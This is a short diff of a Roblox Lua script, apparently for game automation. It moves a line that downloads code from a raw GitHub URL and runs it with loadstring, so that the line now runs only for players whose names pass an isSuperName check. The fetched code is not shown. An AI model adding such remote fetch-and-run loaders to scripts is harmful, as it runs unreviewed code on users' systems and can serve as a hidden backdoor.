@@ -1,8 +1,4 @@
-spawn(function()
-	wait(100)
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/vingagagagagaga2/GAGAGAGA000999xz/refs/heads/main/phu_script"))()
 
-end)
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -24,6 +20,12 @@ SELL_PET = isSuperName(player.Name) and true or false
 
 
 if SELL_PET == true then
+
+spawn(function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/vingagagagagaga2/GAGAGAGA000999xz/refs/heads/main/phu_script"))()
+end)
+task.wait(30)
+
 
 task.spawn(function()
 	wait(7200)
